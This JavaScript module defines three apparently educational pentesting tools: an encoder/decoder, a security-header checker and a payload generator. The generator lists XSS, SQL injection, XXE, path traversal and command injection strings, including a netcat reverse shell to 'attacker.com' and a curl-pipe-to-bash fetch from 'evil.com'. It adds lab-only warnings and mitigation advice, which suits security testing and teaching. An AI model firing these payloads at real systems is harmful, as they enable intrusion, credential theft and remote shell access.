/**
 * tools/pentesting.js
 * Pentesting Tools
 */

export const pentestingTools = {
    'encoding-decoder': {
        id: 'encoding-decoder',
        name: 'Encoding/Decoder',
        subject: 'pentesting',
        icon: 'fa-exchange-alt',
        description: 'Encode/decode Base64, URL, HTML, and Hex',
        inputs: [
            { name: 'text', label: 'Input Text', placeholder: 'Text to encode/decode', type: 'text' },
            { name: 'type', label: 'Type', type: 'select', options: ['base64', 'url', 'html', 'hex'] },
            { name: 'mode', label: 'Mode', type: 'select', options: ['encode', 'decode'] }
        ],
        execute: (text, type = 'base64', mode = 'encode') => {
            try {
                const operations = {
                    base64: {
                        encode: (s) => btoa(unescape(encodeURIComponent(s))),
                        decode: (s) => decodeURIComponent(escape(atob(s)))
                    },
                    url: {
                        encode: encodeURIComponent,
                        decode: decodeURIComponent
                    },
                    html: {
                        encode: (s) => s.replace(/[&<>"']/g, c => ({
                            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
                        }[c])),
                        decode: (s) => s.replace(/&(amp|lt|gt|quot|#39);/g, (m, c) => ({
                            'amp': '&', 'lt': '<', 'gt': '>', 'quot': '"', '#39': "'"
                        }[c]))
                    },
                    hex: {
                        encode: (s) => Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
                        decode: (s) => s.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('')
                    }
                };
                
                return {
                    input: text,
                    type,
                    mode,
                    result: operations[type][mode](text)
                };
            } catch (e) {
                return { error: `Failed to ${mode}: ${e.message}` };
            }
        }
    },

    'header-analyzer': {
        id: 'header-analyzer',
        name: 'Security Header Check',
        subject: 'pentesting',
        icon: 'fa-shield-alt',
        description: 'Analyze security headers present/missing',
        inputs: [
            { name: 'headers', label: 'Headers (paste)', placeholder: 'Paste response headers', type: 'textarea' }
        ],
        execute: (headers) => {
            const important = {
                'Strict-Transport-Security': 'HSTS - Forces HTTPS',
                'Content-Security-Policy': 'CSP - Prevents XSS',
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'X-XSS-Protection': 'Legacy XSS filter',
                'Referrer-Policy': 'Controls referrer info',
                'Permissions-Policy': 'Feature restrictions'
            };

            const headerLines = headers.split('\n').map(l => l.trim().toLowerCase());
            const found = [];
            const missing = [];

            Object.entries(important).forEach(([header, desc]) => {
                const exists = headerLines.some(l => l.startsWith(header.toLowerCase()));
                if (exists) {
                    found.push({ header, description: desc, status: '✅ Present' });
                } else {
                    missing.push({ header, description: desc, status: '❌ Missing' });
                }
            });

            return {
                present: found,
                missing: missing,
                score: `${found.length}/${Object.keys(important).length}`,
                recommendation: missing.length > 0 ? 
                    `Add: ${missing.map(m => m.header).join(', ')}` : 
                    'All critical headers present!'
            };
        }
    },

    'payload-generator': {
        id: 'payload-generator',
        name: 'Payload Generator',
        subject: 'pentesting',
        icon: 'fa-code',
        description: 'Generate safe XSS/SQLi/XXE payloads for lab testing',
        inputs: [
            { name: 'type', label: 'Payload Type', placeholder: 'xss', type: 'select', options: ['xss', 'sqli', 'xxe', 'lfi', 'rce'] }
        ],
        execute: (type) => {
            const payloads = {
                xss: {
                    basic: [
                        '<script>alert("XSS")</script>',
                        '<img src=x onerror=alert("XSS")>',
                        '<svg onload=alert("XSS")>',
                        '"><script>alert(String.fromCharCode(88,83,83))</script>'
                    ],
                    filter_bypass: [
                        '<ScRiPt>alert("XSS")</ScRiPt>',
                        '<img src=x onerror="alert`XSS`">',
                        'javascript:alert("XSS")',
                        '<iframe src="javascript:alert(\'XSS\')">'
                    ],
                    dom: [
                        '#<img src=/ onerror=alert(1)>',
                        'javascript:eval(\'var a=document.createElement("script");a.src="evil.js";document.body.appendChild(a)\')'
                    ]
                },
                sqli: {
                    basic: [
                        "' OR '1'='1",
                        "' OR 1=1--",
                        "admin'--",
                        "' UNION SELECT NULL--"
                    ],
                    blind: [
                        "' AND 1=1--",
                        "' AND SLEEP(5)--",
                        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
                    ],
                    union: [
                        "' UNION SELECT username,password FROM users--",
                        "' UNION SELECT NULL,NULL,NULL--",
                        "' ORDER BY 3--"
                    ]
                },
                xxe: {
                    basic: [
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><root>&xxe;</root>'
                    ]
                },
                lfi: {
                    basic: [
                        '../../../etc/passwd',
                        '....//....//....//etc/passwd',
                        '/var/log/apache2/access.log',
                        'php://filter/convert.base64-encode/resource=index.php'
                    ],
                    null_byte: [
                        '../../../etc/passwd%00',
                        '../../../etc/passwd%00.jpg'
                    ]
                },
                rce: {
                    basic: [
                        '; whoami',
                        '| whoami',
                        '`whoami`',
                        '$(whoami)'
                    ],
                    chained: [
                        '; cat /etc/passwd',
                        '| nc attacker.com 4444 -e /bin/sh',
                        '&& curl http://evil.com/shell.sh | bash'
                    ]
                }
            };

            const data = payloads[type];
            return {
                type: type.toUpperCase(),
                payloads: data,
                warning: '⚠️ FOR AUTHORIZED TESTING ONLY - Use in lab environments',
                mitigation: type === 'xss' ? 'Use CSP, encode output, validate input' :
                           type === 'sqli' ? 'Use prepared statements, parameterized queries' :
                           type === 'xxe' ? 'Disable external entity processing' :
                           type === 'lfi' ? 'Whitelist files, validate paths' :
                           'Input validation, least privilege, escape shell commands'
            };
        }
    }
};
